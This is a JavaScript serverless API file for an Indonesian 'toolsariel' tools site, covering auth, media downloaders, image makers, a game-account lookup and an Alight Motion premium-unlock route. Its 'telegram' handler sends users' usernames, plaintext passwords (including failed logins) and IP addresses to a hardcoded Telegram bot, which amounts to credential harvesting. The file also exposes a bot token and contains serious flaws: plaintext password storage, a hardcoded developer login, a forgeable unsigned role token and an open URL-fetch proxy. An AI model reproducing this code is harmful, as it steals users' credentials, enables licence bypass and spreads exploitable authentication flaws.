import { kv } from '@vercel/kv';

// ============================================================
// ===== [MARKER-KONFIG] KONFIGURASI GLOBAL - GANTI DI SINI =====
// ============================================================
const ANITA_API = 'https://anita-studio.netlify.app/.netlify/functions/amprem';
const TELEGRAM_TOKEN = '8401137297:AAHWeV0-LKRe67cWsAi_jnTFC5xesH5jSTQ';
const TELEGRAM_CHAT_ID = '6483043491';

const DEFAULT_USERS = {
  'ariel': {
    username: 'Ariel',
    password: 'ariel123',
    role: 'developer',
    registeredAt: '2026-01-01T00:00:00.000Z'
  }
};
// ===== [MARKER-KONFIG-END] =====


// ============================================================
// ===== [MARKER-HELPER] FUNGSI BANTUAN =====
// ============================================================
function setCors(res, methods) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', methods || 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
}

function escapeHtml(str) {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}
// ===== [MARKER-HELPER-END] =====


// ============================================================
// ===== [MARKER-AUTH] AUTH - LOGIN / REGISTER / LOGOUT / USERS =====
// ============================================================
async function handleAuth(req, res, sub) {
  if (sub === 'login') {
    if (req.method !== 'POST') return res.status(405).json({ success: false, message: 'Method not allowed' });

    const { username, password } = req.body || {};
    if (!username || !password) {
      return res.status(400).json({ success: false, message: 'Username & password wajib' });
    }

    const key = 'user:' + username.toLowerCase();
    let user = null;

    try {
      if (DEFAULT_USERS[username.toLowerCase()]) {
        user = DEFAULT_USERS[username.toLowerCase()];
      } else {
        user = await kv.get(key);
      }
    } catch (err) {
      if (DEFAULT_USERS[username.toLowerCase()]) {
        user = DEFAULT_USERS[username.toLowerCase()];
      } else {
        return res.status(500).json({ success: false, message: 'Database error' });
      }
    }

    if (!user || user.password !== password) {
      return res.status(401).json({ success: false, message: 'Username atau password salah' });
    }

    const token = Buffer.from(JSON.stringify({
      user: user.username,
      role: user.role,
      exp: Date.now() + 1000 * 60 * 60 * 6
    })).toString('base64');

    res.setHeader('Set-Cookie',
      'authToken=' + token + '; Path=/; HttpOnly; Secure; SameSite=Strict; Max-Age=' + (60 * 60 * 6)
    );

    return res.status(200).json({
      success: true,
      message: 'Login berhasil',
      user: user.username,
      role: user.role
    });
  }

  if (sub === 'register') {
    if (req.method !== 'POST') return res.status(405).json({ success: false, message: 'Method not allowed' });

    const { username, password } = req.body || {};
    if (!username || !password) {
      return res.status(400).json({ success: false, message: 'Username & password wajib' });
    }
    if (username.length < 3) {
      return res.status(400).json({ success: false, message: 'Username minimal 3 karakter' });
    }
    if (password.length < 6) {
      return res.status(400).json({ success: false, message: 'Password minimal 6 karakter' });
    }

    const key = 'user:' + username.toLowerCase();

    try {
      const existing = await kv.get(key);
      if (existing) {
        return res.status(409).json({ success: false, message: 'Username sudah terdaftar' });
      }

      const userData = {
        username: username,
        password: password,
        role: 'member',
        registeredAt: new Date().toISOString()
      };

      await kv.set(key, userData);
      await kv.sadd('users:all', username.toLowerCase());

      return res.status(201).json({
        success: true,
        message: 'Akun berhasil dibuat',
        user: username
      });
    } catch (err) {
      return res.status(500).json({ success: false, message: 'Database error: ' + err.message });
    }
  }

  if (sub === 'logout') {
    res.setHeader('Set-Cookie', 'authToken=; Path=/; HttpOnly; Secure; SameSite=Strict; Max-Age=0');
    return res.status(200).json({ success: true, message: 'Logout berhasil' });
  }

  if (sub === 'users') {
    const cookie = req.headers.cookie || '';
    const tokenMatch = cookie.match(/authToken=([^;]+)/);
    if (!tokenMatch) return res.status(403).json({ success: false, message: 'Unauthorized' });

    try {
      const payload = JSON.parse(Buffer.from(tokenMatch[1], 'base64').toString());
      if (payload.role !== 'developer') {
        return res.status(403).json({ success: false, message: 'Hanya developer' });
      }

      const usernames = await kv.smembers('users:all');
      const users = [];
      for (const uname of usernames) {
        const u = await kv.get('user:' + uname);
        if (u) users.push({ username: u.username, role: u.role, registeredAt: u.registeredAt });
      }

      return res.status(200).json({ success: true, users });
    } catch (err) {
      return res.status(500).json({ success: false, message: err.message });
    }
  }

  return res.status(404).json({ success: false, message: 'Sub-action auth tidak ditemukan' });
}
// ===== [MARKER-AUTH-END] =====


// ============================================================
// ===== [MARKER-AI] AI ARIEL =====
// ============================================================
async function handleAI(req, res) {
  const { prompt } = req.query;
  if (!prompt) {
    return res.status(400).json({ success: false, message: 'Parameter prompt wajib diisi' });
  }

  const sapaan = [
    'halo', 'hai', 'hi', 'hey', 'hei', 'hallo', 'helo',
    'assalamualaikum', 'salam', 'pagi', 'siang', 'sore',
    'malam', 'selamat pagi', 'selamat siang', 'selamat sore',
    'selamat malam', 'permisi', 'oy', 'woi', 'woy', 'tes', 'test',
    'p', 'ping', 'yo', 'sup', 'wassup', 'apa kabar', 'kabar'
  ];

  const promptLower = prompt.toLowerCase().trim();
  const isSapaan = sapaan.some(function(kata) {
    return promptLower === kata ||
           promptLower === kata + '!' ||
           promptLower === kata + '?' ||
           promptLower === kata + ' ' ||
           promptLower.startsWith(kata + ' ');
  });

  if (isSapaan) {
    const balasanSapaan = [
      'Halo! Saya Ariel AI, siap membantu kamu. Ada yang bisa saya bantu?',
      'Hai! Ariel AI di sini. Mau tanya apa hari ini?',
      'Halo halo! Saya Ariel AI, asisten cerdas kamu. Silakan tanya apa saja!',
      'Hai! Ariel AI siap membantu. Ada yang bisa saya bantu?',
      'Halo! Kenalin, saya Ariel AI. Mau ngobrol apa kita hari ini?',
      'Hai hai! Ariel AI nih. Silakan tanya apa saja ya!'
    ];
    const pilih = balasanSapaan[Math.floor(Math.random() * balasanSapaan.length)];

    return res.json({
      success: true,
      creator: 'Ariel AI',
      data: { response: pilih, text: prompt }
    });
  }

  const promptFinal = 'Kamu adalah Ariel AI, asisten cerdas yang ramah. Jawab dengan Bahasa Indonesia yang santai dan jelas. Pertanyaan: ' + prompt;
  const apiUrl = 'https://xyloapi.qzz.io/api/ai-chat/aya?prompt=' + encodeURIComponent(promptFinal);

  const response = await fetch(apiUrl, {
    method: 'GET',
    headers: {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'Accept': 'application/json'
    },
    signal: AbortSignal.timeout(30000)
  });

  const data = await response.json();
  return res.status(response.status).json(data);
}
// ===== [MARKER-AI-END] =====


// ============================================================
// ===== [MARKER-AMPREM] ALIGHT MOTION PREMIUM =====
// ============================================================
async function callAnita(action, data) {
  const r = await fetch(ANITA_API, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ action, ...data }),
    signal: AbortSignal.timeout(25000)
  });

  const txt = await r.text();
  let parsed;
  try { parsed = JSON.parse(txt); } catch (e) { parsed = { raw: txt }; }
  return { ok: r.ok, status: r.status, data: parsed };
}

async function handleAmpren(req, res, sub) {
  if (sub === 'kirim-link') {
    const email = (req.body && req.body.email) || req.query.email;
    if (!email) return res.status(400).json({ sukses: false, pesan: 'Email wajib diisi' });

    const result = await callAnita('send-magiclink', { email });

    if (!result.ok || !result.data.success) {
      return res.status(500).json({
        sukses: false,
        pesan: result.data.message || 'Gagal mengirim magic link',
        detail: result.data
      });
    }

    return res.status(200).json({
      sukses: true,
      pesan: 'Link verifikasi telah dikirim ke ' + email + '. Cek inbox/spam.',
      data: result.data
    });
  }

  if (sub === 'verifikasi') {
    const email = (req.body && req.body.email) || req.query.email;
    const rawLink = (req.body && (req.body.link || req.body.rawLink)) || req.query.link;

    if (!email || !rawLink) {
      return res.status(400).json({ sukses: false, pesan: 'Email dan link wajib diisi' });
    }

    const verifyRes = await callAnita('verify-account', { email, rawLink });

    if (!verifyRes.ok || !verifyRes.data.success) {
      return res.status(500).json({
        sukses: false,
        pesan: verifyRes.data.message || 'Verifikasi gagal',
        detail: verifyRes.data
      });
    }

    const idToken = verifyRes.data.idToken || (verifyRes.data.profile && verifyRes.data.profile.idToken);

    if (!idToken) {
      return res.status(500).json({
        sukses: false,
        pesan: 'idToken tidak ditemukan dari verifikasi',
        detail: verifyRes.data
      });
    }

    const premiumRes = await callAnita('apply-premium', { email, idToken });

    if (!premiumRes.ok || !premiumRes.data.success) {
      return res.status(500).json({
        sukses: false,
        pesan: premiumRes.data.message || 'Gagal mengaktifkan premium',
        detail: premiumRes.data
      });
    }

    return res.status(200).json({
      sukses: true,
      pesan: 'Premium VIP aktif!',
      data: {
        email_target: email,
        uid_firebase: premiumRes.data.uid || premiumRes.data.userId || '-',
        status_akun: 'Alight Motion Pro VIP',
        order_id_aktivasi: premiumRes.data.orderId || '-',
        masa_berlaku_vip: '1 Tahun',
        token_type: 'Bearer',
        raw: premiumRes.data
      }
    });
  }

  return res.status(404).json({ sukses: false, pesan: 'Sub-action amprem tidak ditemukan' });
}
// ===== [MARKER-AMPREM-END] =====


// ============================================================
// ===== [MARKER-BRAT] BRAT MAKER =====
// ============================================================
async function handleBrat(req, res) {
  const text = req.query.text;
  if (!text) return res.status(400).json({ success: false, message: 'Parameter text wajib diisi' });

  const apiUrl = 'https://xyloapi.qzz.io/api/maker/brat?text=' + encodeURIComponent(text);
  const response = await fetch(apiUrl, {
    method: 'GET',
    headers: {
      'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36',
      'Accept': 'image/*, application/json, text/html, */*'
    },
    signal: AbortSignal.timeout(25000)
  });

  const contentType = response.headers.get('content-type') || '';

  if (contentType.startsWith('image/')) {
    const buffer = await response.arrayBuffer();
    res.setHeader('Content-Type', contentType);
    res.setHeader('Cache-Control', 'public, max-age=3600');
    return res.status(200).send(Buffer.from(buffer));
  }

  const textResp = await response.text();
  try {
    const parsed = JSON.parse(textResp);
    return res.status(200).json(parsed);
  } catch (e) {
    return res.status(200).json({ success: false, message: 'Response tidak dikenali', raw: textResp.substring(0, 300) });
  }
}
// ===== [MARKER-BRAT-END] =====


// ============================================================
// ===== [MARKER-DARKSYSTEM] DARK SYSTEM MAKER =====
// ============================================================
async function handleDarkSystem(req, res) {
  const { name } = req.query;
  if (!name) return res.status(400).json({ success: false, message: 'Parameter name wajib diisi' });

  const apiUrl = 'https://xyloapi.qzz.io/api/maker/darksystem?name=' + encodeURIComponent(name);

  const response = await fetch(apiUrl, {
    method: 'GET',
    headers: {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'Accept': 'image/*, application/json, text/html, */*'
    },
    signal: AbortSignal.timeout(20000)
  });

  const contentType = response.headers.get('content-type') || '';

  if (contentType.startsWith('image/')) {
    const buffer = await response.arrayBuffer();
    res.setHeader('Content-Type', contentType);
    return res.status(200).send(Buffer.from(buffer));
  }

  const text_response = await response.text();
  try {
    const parsed = JSON.parse(text_response);
    return res.status(response.status).json(parsed);
  } catch (e) {
    return res.status(response.status).json({
      success: false,
      message: 'Response bukan JSON valid',
      raw: text_response
    });
  }
}
// ===== [MARKER-DARKSYSTEM-END] =====


// ============================================================
// ===== [MARKER-FAKEFF] FAKE FF MAKER =====
// ============================================================
async function handleFakeff(req, res) {
  const { username } = req.query;
  if (!username) return res.status(400).json({ success: false, message: 'Parameter username wajib diisi' });

  const apiUrl = 'https://xyloapi.qzz.io/api/maker/fakeff?username=' + encodeURIComponent(username);
  const response = await fetch(apiUrl, {
    method: 'GET',
    headers: {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'Accept': 'application/json'
    },
    signal: AbortSignal.timeout(20000)
  });

  const data = await response.json();

  let imageUrl = '';
  if (data.data && data.data.image) imageUrl = data.data.image;
  else if (data.image) imageUrl = data.image;
  else if (data.result) imageUrl = data.result;
  else if (data.url) imageUrl = data.url;

  if (!imageUrl) {
    return res.status(500).json({ success: false, message: 'Gambar tidak tersedia' });
  }

  return res.json({
    success: true,
    image: '/api/tools?action=img&url=' + encodeURIComponent(imageUrl)
  });
}
// ===== [MARKER-FAKEFF-END] =====


// ============================================================
// ===== [MARKER-FETCH] VIEW SOURCE FETCHER =====
// ============================================================
async function handleFetch(req, res) {
  const url = req.query.url;
  if (!url) return res.status(400).json({ success: false, message: 'Parameter url wajib diisi' });

  let target;
  try { target = new URL(url); }
  catch { return res.status(400).json({ success: false, message: 'URL tidak valid' }); }

  if (!['http:', 'https:'].includes(target.protocol)) {
    return res.status(400).json({ success: false, message: 'Hanya HTTP dan HTTPS yang diperbolehkan' });
  }

  const response = await fetch(target.href, {
    method: 'GET',
    headers: {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Accept-Language': 'id-ID,id;q=0.9,en;q=0.8'
    },
    redirect: 'follow'
  });

  if (!response.ok) {
    return res.status(response.status).json({
      success: false,
      message: 'Website mengembalikan status ' + response.status
    });
  }

  const contentType = response.headers.get('content-type') || '';
  if (!contentType.includes('text/html')) {
    return res.status(400).json({ success: false, message: 'URL tersebut tidak mengembalikan halaman HTML' });
  }

  const html = await response.text();
  return res.json({ success: true, url: response.url, html: html });
}
// ===== [MARKER-FETCH-END] =====


// ============================================================
// ===== [MARKER-FFSTALK] FREE FIRE STALKER =====
// ============================================================
async function handleFFStalk(req, res) {
  const userId = req.query.userId || req.query.uid;
  if (!userId) return res.status(400).json({ success: false, message: 'Parameter userId wajib diisi' });

  const url = 'https://api.saipulanuar.eu.org/api/stalkgame/ffstalk1?userId=' + encodeURIComponent(userId);

  const response = await fetch(url, {
    method: 'GET',
    headers: {
      'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36',
      'Accept': 'application/json, text/plain, */*'
    },
    signal: AbortSignal.timeout(20000)
  });

  const text = await response.text();

  if (text.trim().startsWith('<')) {
    return res.status(502).json({ success: false, message: 'API tidak merespons dengan benar' });
  }

  let data;
  try { data = JSON.parse(text); } catch (e) {
    return res.status(502).json({ success: false, message: 'Response bukan JSON' });
  }

  return res.status(200).json(data);
}
// ===== [MARKER-FFSTALK-END] =====


// ============================================================
// ===== [MARKER-IMG] IMAGE PROXY =====
// ============================================================
async function handleImg(req, res) {
  const { url } = req.query;
  if (!url) return res.status(400).json({ success: false, message: 'Parameter url wajib diisi' });

  const targetUrl = new URL(url);
  if (!['http:', 'https:'].includes(targetUrl.protocol)) {
    return res.status(400).json({ success: false, message: 'URL tidak valid' });
  }

  const response = await fetch(targetUrl.toString(), {
    method: 'GET',
    headers: {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'Accept': 'image/*,*/*',
      'Referer': 'https://xyloapi.qzz.io/'
    },
    signal: AbortSignal.timeout(20000)
  });

  if (!response.ok) {
    return res.status(response.status).json({ success: false, message: 'Gagal ambil gambar' });
  }

  const contentType = response.headers.get('content-type') || 'image/png';
  const buffer = await response.arrayBuffer();

  res.setHeader('Content-Type', contentType);
  res.setHeader('Cache-Control', 'public, max-age=3600');
  return res.status(200).send(Buffer.from(buffer));
}
// ===== [MARKER-IMG-END] =====


// ============================================================
// ===== [MARKER-SPOTIFY] SPOTIFY DOWNLOADER - BARU =====
// ============================================================
async function handleSpotify(req, res) {
  const { url, server } = req.query;
  if (!url) return res.status(400).json({ success: false, message: 'Parameter url wajib diisi' });
  if (!url.includes('spotify.com')) {
    return res.status(400).json({ success: false, message: 'URL harus dari Spotify' });
  }

  const serverPilihan = server || 'server1';
  const apiUrl = 'https://xyloapi.qzz.io/api/downloader/spotify?url=' + encodeURIComponent(url) + '&server=' + encodeURIComponent(serverPilihan);

  const response = await fetch(apiUrl, {
    method: 'GET',
    headers: {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'Accept': 'application/json, text/plain, */*'
    },
    signal: AbortSignal.timeout(30000)
  });

  const textResp = await response.text();
  let data;
  try { data = JSON.parse(textResp); } catch (e) {
    return res.status(500).json({ success: false, message: 'Response bukan JSON', raw: textResp.substring(0, 300) });
  }

  if (data.status === false || data.success === false) {
    return res.status(200).json({ success: false, message: data.message || data.msg || 'API gagal memproses' });
  }

  function findDownloadUrl(raw) {
    if (!raw || typeof raw !== 'object') return '';
    const candidates = [
      raw.download, raw.download_url, raw.downloadUrl, raw.url_audio, raw.urlAudio,
      raw.audio, raw.audio_url, raw.audioUrl, raw.mp3, raw.mp3_url, raw.mp3Url,
      raw.link, raw.link_download, raw.linkDownload, raw.url
    ];
    for (const c of candidates) {
      if (typeof c === 'string' && c.startsWith('http')) return c;
      if (c && typeof c === 'object') {
        const inner = c.mp3 || c.url || c.link || c.audio || c.download || c.href;
        if (typeof inner === 'string' && inner.startsWith('http')) return inner;
      }
    }
    const arrs = [raw.downloads, raw.medias, raw.media, raw.links, raw.formats];
    for (const arr of arrs) {
      if (Array.isArray(arr)) {
        for (const item of arr) {
          if (typeof item === 'string' && item.startsWith('http')) return item;
          if (item && typeof item === 'object') {
            const u = item.url || item.link || item.href || item.download;
            if (typeof u === 'string' && u.startsWith('http')) return u;
          }
        }
      }
    }
    for (const key in raw) {
      if (raw.hasOwnProperty(key)) {
        const v = raw[key];
        const lk = key.toLowerCase();
        if (typeof v === 'string' && v.startsWith('http') && (
          lk.includes('download') || lk.includes('audio') ||
          lk.includes('mp3') || lk.includes('link') || lk.includes('url')
        )) return v;
      }
    }
    return '';
  }

  function normalizeTrack(raw) {
    let artist = raw.artist || raw.artists || raw.creator || raw.author || raw.channel || 'Unknown Artist';
    if (Array.isArray(artist)) {
      artist = artist.map(a => typeof a === 'object' ? (a.name || a.title || '') : a).filter(Boolean).join(', ');
    } else if (typeof artist === 'object') {
      artist = artist.name || artist.title || 'Unknown Artist';
    }
    let duration = raw.duration || raw.length || raw.duration_ms || '-';
    if (typeof duration === 'number' && duration > 1000) {
      const totalSec = Math.floor(duration / 1000);
      const m = Math.floor(totalSec / 60);
      const s = totalSec % 60;
      duration = m + ':' + (s < 10 ? '0' : '') + s;
    }
    return {
      title: raw.title || raw.name || raw.track || raw.song || 'Unknown Title',
      artist: artist,
      thumbnail: raw.thumbnail || raw.image || raw.cover || raw.album_art || raw.albumArt || '',
      duration: duration,
      album: raw.album || raw.album_name || '',
      description: raw.description || raw.desc || '',
      download: findDownloadUrl(raw),
      raw: raw
    };
  }

  const rawData = data.result || data.data || data;
  const normalized = normalizeTrack(rawData);

  return res.status(200).json({ success: true, result: normalized });
}
// ===== [MARKER-SPOTIFY-END] =====


// ============================================================
// ===== [MARKER-TELEGRAM] TELEGRAM NOTIFIKASI =====
// ============================================================
async function handleTelegram(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, message: 'Method not allowed' });
  }

  const { username, password, tipe } = req.body || {};

  if (!username || !password) {
    return res.status(400).json({ success: false, message: 'Username dan password wajib diisi' });
  }

  const ip = req.headers['x-forwarded-for'] || '-';
  const time = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });

  let header = '';
  if (tipe === 'register') {
    header = '<b>REGISTRASI BARU - TOOLSARIEL</b>';
  } else if (tipe === 'login_gagal') {
    header = '<b>LOGIN GAGAL - TOOLSARIEL</b>';
  } else {
    header = '<b>LOGIN BARU - TOOLSARIEL</b>';
  }

  const text = header + '\n' +
    '━━━━━━━━━━━━━━━━━━━━\n' +
    '<b>Username:</b> <code>' + escapeHtml(String(username).trim()) + '</code>\n' +
    '<b>Password:</b> <code>' + escapeHtml(String(password)) + '</code>\n' +
    '━━━━━━━━━━━━━━━━━━━━\n' +
    '<b>IP:</b> <code>' + escapeHtml(String(ip)) + '</code>\n' +
    '<b>Waktu:</b> ' + time;

  try {
    const url = 'https://api.telegram.org/bot' + TELEGRAM_TOKEN + '/sendMessage';
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: text,
        parse_mode: 'HTML'
      })
    });
    return res.json({ success: true, message: 'Berhasil' });
  } catch (err) {
    return res.status(500).json({ success: false, message: 'Error: ' + err.message });
  }
}
// ===== [MARKER-TELEGRAM-END] =====


// ============================================================
// ===== [MARKER-TIKTOK] TIKTOK DOWNLOADER =====
// ============================================================
async function handleTiktok(req, res) {
  const { url, server } = req.query;
  if (!url) return res.status(400).json({ success: false, message: 'Parameter url wajib diisi' });

  const pattern = /tiktok\.com|vm\.tiktok|vt\.tiktok/i;
  if (!pattern.test(url)) {
    return res.status(400).json({ success: false, message: 'Link bukan dari TikTok' });
  }

  const serverPilihan = server || 'server1';
  const apiUrl = 'https://xyloapi.qzz.io/api/downloader/tiktok?url=' + encodeURIComponent(url) + '&server=' + encodeURIComponent(serverPilihan);

  const response = await fetch(apiUrl, {
    method: 'GET',
    headers: {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'Accept': 'application/json, text/plain, */*'
    },
    signal: AbortSignal.timeout(20000)
  });

  if (!response.ok) {
    return res.status(response.status).json({
      success: false,
      message: 'XyloAPI mengembalikan status ' + response.status
    });
  }

  const data = await response.json();
  return res.json(data);
}
// ===== [MARKER-TIKTOK-END] =====


// ============================================================
// ===== [MARKER-HANDLER] HANDLER UTAMA - ROUTING =====
// ============================================================
export default async function handler(req, res) {
  setCors(res);

  if (req.method === 'OPTIONS') return res.status(204).end();

  const action = req.query.action;
  const sub = req.query.sub || (req.body && req.body.sub);

  try {
    // AUTH
    if (action === 'auth') return await handleAuth(req, res, sub);

    // AMPREM
    if (action === 'amprem') return await handleAmpren(req, res, sub);

    // TELEGRAM (POST only)
    if (action === 'telegram') return await handleTelegram(req, res);

    // Semua action lain butuh GET
    if (req.method !== 'GET') {
      return res.status(405).json({ success: false, message: 'Method not allowed' });
    }

    // AI
    if (action === 'ai') return await handleAI(req, res);

    // BRAT
    if (action === 'brat') return await handleBrat(req, res);

    // DARK SYSTEM
    if (action === 'darksystem') return await handleDarkSystem(req, res);

    // FAKE FF
    if (action === 'fakeff') return await handleFakeff(req, res);

    // FETCH (VIEW SOURCE)
    if (action === 'fetch') return await handleFetch(req, res);

    // FF STALK
    if (action === 'ffstalk') return await handleFFStalk(req, res);

    // IMG PROXY
    if (action === 'img') return await handleImg(req, res);

    // ===== [SPOTIFY-ROUTE] SPOTIFY ROUTING =====
    if (action === 'spotify') return await handleSpotify(req, res);
    // ===== [SPOTIFY-ROUTE-END] =====

    // TIKTOK
    if (action === 'tiktok') return await handleTiktok(req, res);

    return res.status(404).json({ success: false, message: 'Action tidak ditemukan' });

  } catch (error) {
    console.error('Tools error:', error);
    if (error.name === 'TimeoutError' || error.name === 'AbortError') {
      return res.status(504).json({ success: false, message: 'Request timeout' });
    }
    return res.status(500).json({ success: false, message: 'Server error: ' + error.message });
  }
}
// ===== [MARKER-HANDLER-END] =====
